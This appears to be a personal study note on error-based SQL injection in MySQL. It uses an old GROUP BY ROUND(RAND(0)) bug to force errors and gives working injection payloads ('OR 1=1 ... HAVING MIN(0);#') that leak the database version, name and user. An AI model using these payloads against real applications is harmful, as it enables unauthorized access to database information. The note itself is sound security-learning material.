---
title: ERROR based (In-band) Injection
tags:
  - security
  - sqli
  - web
date: 2024-01-28 14:15:56 -0600
updated: 2024-01-28 14:15:56 -0600
---

#### Bug in MySQL
Bug Present in old versions of MySQL  
[MySQL Bugs: 82544](https://bugs.mysql.com/bug.php?id=82544)  

By using seed we are going to generate the same values every time. If the table has at least 3 entries then by rounding the values 2 of they are going to be the same and we can cause the bug

````sql
-- Seed will create the same values very time
SELECT name, RAND(0) 
FROM users; 

-- Column with rounded values
SELECT name, RAND(0), ROUND(RAND(0)) 
FROM users; 

SELECT name 
FROM users 
GROUP BY ROUND(RAND(0));
````

#### Triggering the Bug

````sql
SELECT name 
FROM users 
GROUP BY ROUND(RAND(0)) HAVING MIN(0);

SELECT name, COUNT(*) 
FROM users 
GROUP BY ROUND(RAND(0));
````

The count() approach is mostly useless as the statement till the where clause is going to be fixed by the application we can only control the part that comes after the where clause

````sql
SELECT name 
FROM users 
WHERE username="sagar" OR 1=1 
GROUP BY ROUND(RAND(0)) HAVING MIN(0);
````

#### Getting Information using Bug

````sql
OR 1=1 
GROUP BY ROUND(RAND(0)) HAVING MIN(0);#

OR 1=1 
GROUP BY CONCAT(version(), " ", database(), " ", user(), " ", ROUND(RAND())) HAVING MIN(0);#
````
